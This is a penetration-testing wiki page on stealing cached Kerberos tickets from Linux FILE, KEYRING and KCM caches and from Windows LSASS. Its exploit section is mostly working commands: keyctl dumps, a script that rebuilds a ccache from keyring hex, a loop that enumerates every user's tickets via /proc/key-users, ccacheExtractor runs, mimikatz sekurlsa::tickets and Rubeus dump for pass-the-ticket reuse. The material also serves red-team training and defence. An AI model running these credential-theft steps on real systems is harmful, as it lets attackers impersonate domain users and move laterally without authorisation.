## Theory
Kerberos tickets can be cached on systems to allow for faster authentication without requiring users to re-enter credentials.
### Storage method
=== "UNIX-like"
    On Linux and other UNIX-like systems, tickets can be stored in 3 different ways:

    | **Storage** | **Description**                                                                                       |
    |-------------|-------------------------------------------------------------------------------------------------------|
    | `FILE`      | Stores tickets in files, typically under `/tmp` directory, in the format `krb5cc_%{uid}`             |
    | `KEYRING`   | Stores tickets in a dedicated kernel keyring space, only accessible to the ticket owner              |
    | `KCM`       | Stores tickets in an LDAP-like database, typically at `/var/lib/sss/secrets/secrets.ldb` (default when using SSSD) |

    The storage method is configured via the `default_ccache_name` parameter in `/etc/krb5.conf`, which is readable by all users.
    !!! note
        This configuration can be overridden by files in `/etc/krb5.conf.d/`. When using SSSD, the value is typically set in `/etc/krb5.conf.d/kcm_default_ccache`
=== "Windows"
    On Windows systems, Kerberos tickets are stored in memory by the Local Security Authority Subsystem Service (LSASS) process.
## Exploit
### From UNIX
=== "File Storage"
    Tickets are stored as files in the configured directory (default: `/tmp`). These files can be directly used for `Pass-the-Ticket` attacks.
=== "KEYRING Storage"
    !!! note
        While root cannot directly read other users' keyring content, they can still access tickets by using **su - $user**
    
    The keyctl utility (commonly pre-installed) can be used to read keyring content:
    ```bash
    # Get persistent keyring address
    keyctl get_persistent @u

    # Show keyring content
    keyctl show 30711432
    ```
    It will display the content of the keyring in a readable format.
    ```bash
    Keyring
        30711432 ---lswrv      0 65534  keyring: _persistent.0
        127492740 --alswrv      0     0   \_ keyring: _krb
        556713767 --alswrv      0     0       \_ user: krb_ccache:primary
        1002684101 --alswrv      0     0       \_ keyring: 0
        110355059 --alswrv      0     0           \_ user: __krb5_princ__
        575224320 --als-rv      0     0           \_ big_key: krb5_ccache_conf_data/pa_type/krbtgt\/LAB.LOCAL\@LAB.LOCAL@X-CACHECONF:
        161110247 --als-rv      0     0           \_ big_key: krbtgt/LAB.LOCAL@LAB.LOCAL
        760223933 --alswrv      0     0           \_ user: __krb5_time_offsets__
    ```
    To reconstruct a Kerberos ticket:

    1. The __krb5_princ__ value (in the example above, it's 110355059)
    2. The service key value (the big_key value. In the example above, it's 161110247)
    ```bash
    # Get principal value
    keyctl print $PRINCIPALS_ADDRESS

    # Get service key
    keyctl print $KEY_ADDRESS

    The result will be an hexadecimal string, that can be appended to the ticket header to reconstruct the full ticket.

    # Reconstruct ticket
    HEADER='0504000c00010008ffffffff00000000'
    PRINCIPALS=$(keyctl print $PRINCIPALS_ADDRESS | awk -F : '{print $3}')
    KEY=$(keyctl print $KEY_ADDRESS | awk -F : '{print $3}')
    ticket=$HEADER$PRINCIPALS$KEY

    # Save to file
    echo "$ticket" | xxd -r -p > ticket.ccache
    ```
    !!! note
        [CCacheExtractor](https://github.com/Hakumarachi/ccacheExtractor) can automate this process:
        ```bash
        python3 ccacheExtractor.py keyring --principals $PRINCIPALS --key $KEY
        ```
    
    A domain joined machine can cache lots of tickets from different users. It would be tedious to list them all manually. To list all available tickets, the `/proc/key-users` file can be used. It's readable by all users and contains the list of all users with persistent keyrings.
    ```bash
    # List all tickets
    for uid in $(awk '{print$1}' /proc/key-users | tr -d :); do
        res=$(KRB5CCNAME=KEYRING:persistent:$uid klist 2>&1)
        if [ $? -eq 0 ]; then
            echo -e "\n=== UID $uid ==="
            echo "$res"
        fi
    done

    # Use a specific ticket
    KRB5CCNAME=KEYRING:persistent:$UID
    ```
    !!! note
        [keyringCCacheDumper](https://github.com/Hakumarachi/keyringCCacheDumper) can automatically extract all tickets.
=== "KCM Storage"
    KCM stores tickets in an LDB database file, typically only readable by root. [CCacheExtractor](https://github.com/Hakumarachi/ccacheExtractor) can be used to extract tickets:
    ```bash
    # Extract all tickets from LDB database
    python3 ccacheExtractor.py kcm ./secrets.ldb
    ```
    Extracted tickets can then be used with Pass-the-cache or Pass-the-tickets depending on the ticket type.
### From Windows
On Windows, Kerberos tickets (TGT and TGS) are stored and managed internally by the LSASS process and are not saved as files (unlike on Linux). However, tools like Mimikatz or Rubeus can extract and parse these tickets from memory.

- with mimikatz
```bash
mimikatz # sekurlsa::tickets
```
- with Rubeus
    Ticket can be dumped and saved to `.kirbi` files (MIT-compatile Kerberos tikcet format)
```bash
Rubeus.exe dump /luid:0x3e7 /nowrap /export
```
!!! note
    `.kirbi` is the Windows-compatible file format for Kerberos tickets (same as MIT’s `.ccache`, but different encoding). It can be used with tools like:

    - Rubeus (asktgt, s4u, ptt)

    - Impacket (psexec.py, getTGT.py)

    - Mimikatz (kerberos::ptt ticket.kirbi)
    
    In hackthebox machines or other platform like OSCP, some machines may cache ticket in format `.kirbi` or `.ccache` for hint